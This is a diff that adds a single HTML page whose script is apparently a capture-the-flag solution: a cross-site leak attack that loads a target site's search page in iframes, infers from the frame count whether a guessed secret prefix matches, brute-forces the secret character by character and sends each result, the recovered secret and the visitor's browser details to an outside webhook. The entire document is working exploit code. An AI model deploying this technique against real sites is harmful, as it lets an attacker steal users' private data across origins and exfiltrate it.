@@ -1,0 +1,76 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const WH = "https://webhook.site/11fdbc87-1978-4be6-90c7-c089fd863b23";
+const TARGET = "https://wonder.cbd2026.cloud/search?q=";
+const CHARS = "0123456789abcdef}";
+
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+const leak = msg => {
+  new Image().src = WH + "?d=" + encodeURIComponent(msg);
+};
+
+async function probe(query) {
+  return new Promise(resolve => {
+    const frame = document.createElement("iframe");
+    let settled = false;
+
+    const finish = value => {
+      if (settled) return;
+      settled = true;
+      try { frame.remove(); } catch (e) {}
+      resolve(value);
+    };
+
+    frame.onload = async () => {
+      await sleep(400);
+      let count = 0;
+      try { count = frame.contentWindow.length; } catch (e) {}
+      finish(count > 0);
+    };
+
+    setTimeout(() => finish(false), 5000);
+    frame.src = TARGET + encodeURIComponent(query);
+    document.body.appendChild(frame);
+  });
+}
+
+(async () => {
+  leak("start:" + navigator.userAgent);
+
+  let flag = "cbd{";
+  if (!(await probe(flag))) {
+    leak("prefix_failed:" + flag);
+    return;
+  }
+
+  leak("prefix_ok:" + flag);
+
+  for (let i = 0; i < 80; i++) {
+    let found = false;
+
+    for (const c of CHARS) {
+      const guess = flag + c;
+      const ok = await probe(guess);
+      leak("try:" + guess + ":" + ok);
+
+      if (ok) {
+        flag = guess;
+        leak("hit:" + flag);
+        found = true;
+
+        if (c === "}") {
+          leak("FINAL:" + flag);
+          return;
+        }
+        break;
+      }
+    }
+
+    if (!found) {
+      leak("stuck:" + flag);
+      return;
+    }
+  }
+})();
+</script>
